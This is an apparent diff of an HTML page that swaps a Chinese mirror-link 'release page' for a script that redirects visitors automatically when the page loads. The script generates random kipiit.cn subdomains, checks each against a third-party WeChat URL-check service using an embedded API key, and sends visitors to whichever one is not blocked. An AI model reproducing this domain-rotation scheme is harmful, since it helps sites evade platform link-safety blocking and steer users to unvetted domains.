@@ -1,76 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YYDS丨永久发布页</title>
-    <link rel="shortcut icon" href="">
-    <link rel="stylesheet" href="assets/css/style.css">
-    <script type="text/javascript" src="assets/js/style.js"></script>
-    <style>
-    .bj{
-    background-image: url(assets/img/bg.svg);
-	background-size: cover;
-        }
-        
-    </style>
-</head>
-<body class="bj">
-    <div>
-        <div class="popup popup-tips none popupShow" id="popup">
-            <div class="popup-header">
-                <h3 class="popup-title">
-                    🤪YYDS丨发布页🤪
-                </h3>
-            </div>
-            <div class="popup-main">
-                <p>
-                    🚨 为防止网站失联迷路，建议收藏本页地址！
-                </p>
-                <p class="popup-domain">
-                    <span>
-                        线路1
-                    </span>
-                    <strong>
-                        <a href="https://www.jaysi.cn" target="_blank">
-                            点击进入
-                        </a>
-                    </strong>
-                </p>
-                <p class="popup-domain">
-                    <span>
-                        线路2
-                    </span>
-                    <strong>
-                        <a href="https://www.baidu.com" target="_blank">
-                            点击进入
-                        </a>
-                    </strong>
-                </p>
-                <p class="popup-domain">
-                    <span>
-                        线路3
-                    </span>
-                    <strong>
-                        <a href="https://www.baidu.com" target="_blank">
-                        点击进入
-                        </a>
-                    </strong>
-                </p>
 
-               
-                <p align="center">
-                    <strong>
-                        请 Ctrl+D 收藏本页到浏览器收藏夹
-                    </strong>
-                </p>
-            </div>
-            <div class="popup-footer">
-                <div class="popup-btn close-pop">
-                    <button type="submit" onclick="javascript:addFavorite2()">收到，OVER</button>
-                </div>
-            </div>
-        </div>
-    </div>
+<head>
+  <meta charset="UTF-8">
+  <title>Random Sub - Domain Redirect</title>
+</head>
+
+<body>
+<script>
+  // 生成两位随机字符的函数
+  function getRandomTwoChars() {
+    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < 2; i++) {
+      var randomIndex = Math.floor(Math.random() * chars.length);
+      result += chars[randomIndex];
+    }
+    return result;
+  }
+
+  // 检测域名是否有效的函数
+  function checkDomain(url) {
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        if (data.Code === "102") {
+          // 如果返回的信息是102，则跳转到该域名
+          window.location.href = decodeURIComponent(data.Data);
+        } else if (data.Code === "002") {
+          // 如果返回的是002，则等待20秒再检测
+          setTimeout(() => {
+            var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
+            checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
+          }, 20000); // 20000毫秒 = 20秒
+        } else {
+          // 处理其他返回情况
+          var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
+          checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
+        }
+      })
+      .catch(error => {
+        console.error('检测域名时发生错误:', error);
+      });
+  }
+
+  // 开始检测域名
+  var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
+  checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
+</script>
 </body>
+
 </html>
